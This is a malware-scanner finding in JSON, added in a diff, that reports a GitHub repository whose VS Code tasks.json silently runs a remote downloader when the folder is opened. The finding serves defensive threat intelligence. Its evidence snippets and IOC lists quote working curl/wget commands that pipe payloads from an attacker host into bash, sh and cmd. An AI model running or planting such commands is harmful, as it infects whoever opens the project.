@@ -1,0 +1,67 @@
+{
+  "finding": {
+    "key": "repository:dapperlabsmd/dapperlabs-mvp",
+    "kind": "repository",
+    "id": "dapperlabsmd/dapperlabs-mvp",
+    "url": "https://github.com/DapperlabsMD/Dapperlabs-MVP",
+    "registry": "github",
+    "owner": "dapperlabsmd",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 5,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "install_hook/vscode-autorun",
+    "evidence_locations": ".vscode/tasks.json:0",
+    "c2_hosts": "moralismvp.s.gy",
+    "iocs": "moralismvp.s.gy; https://moralismvp.s.gy/M; https://moralismvp.s.gy/L; https://moralismvp.s.gy/W; curl -L 'https://moralismvp.s.gy/M' | bash; .vscode/tasks.json",
+    "matched_signatures": "folderOpen curl filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 5)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
+    "evidence_file": "repositories/dapperlabsmd_dapperlabs-mvp.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl -L 'https://moralismvp.s.gy/M' | bash wget -qO- 'https://moralismvp.s.gy/L' | sh curl --ssl-no-revoke -L https://moralismvp.s.gy/W | cmd"
+    },
+    {
+      "file": ".vscode/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "curl -L 'https://moralismvp.s.gy/M' | bash wget -qO- 'https://moralismvp.s.gy/L' | sh curl --ssl-no-revoke -L https://moralismvp.s.gy/W | cmd"
+    }
+  ],
+  "commit_sha": "2a81979c6860d6072a4a8566bd0dea37326cdea0",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/dapperlabsmd/dapperlabs-mvp",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: folderOpen curl filename:tasks.json. The delivery method, a .vscode/tasks.json task that automatically runs a remote shell command the moment the repository is opened in VS Code, matches the DPRK-attributed 'Contagious Interview' campaign, in which fake recruiters lure developers into opening a coding-task repository that silently executes a first-stage downloader. The payload is fetched from attacker-controlled infrastructure: moralismvp.s.gy. Attribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. The evidence behind this is: (1) Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun.",
+    "payload_description": "The malicious payload sits in .vscode/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. Detection rules that fired in this repository: install_hook/vscode-autorun (1 file).",
+    "publisher": "dapperlabsmd",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/dapperlabsmd/dapperlabs-mvp/blob/2a81979c6860d6072a4a8566bd0dea37326cdea0/.vscode/tasks.json",
+    "verified_iocs": "moralismvp.s.gy\nhttps://moralismvp.s.gy/M\nhttps://moralismvp.s.gy/L\nhttps://moralismvp.s.gy/W\ncurl -L 'https://moralismvp.s.gy/M' | bash\n.vscode/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
+  }
+}
